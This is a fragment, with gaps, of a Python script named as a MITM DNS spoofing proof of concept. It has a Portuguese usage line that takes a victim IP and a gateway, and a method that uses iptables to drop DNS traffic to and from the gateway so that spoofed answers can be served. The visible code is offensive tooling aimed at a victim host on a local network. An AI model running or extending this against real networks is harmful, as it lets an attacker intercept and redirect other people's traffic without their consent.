...
#modo de usar : python3 MitmDnsSpoofingPoC.py -t ipDaVitima -g gateway 
...
class DNSSpoofing():
	...
	def redirectionRules():
		...
		os.system("iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.2.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.2.1 --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
		os.system("iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.2.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.2.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")
...
if __name__ == '__main__':
	...
	parser.add_argument("-g", "--gateway", required=True, default="192.168.2.1", help="Gateway IP Address")
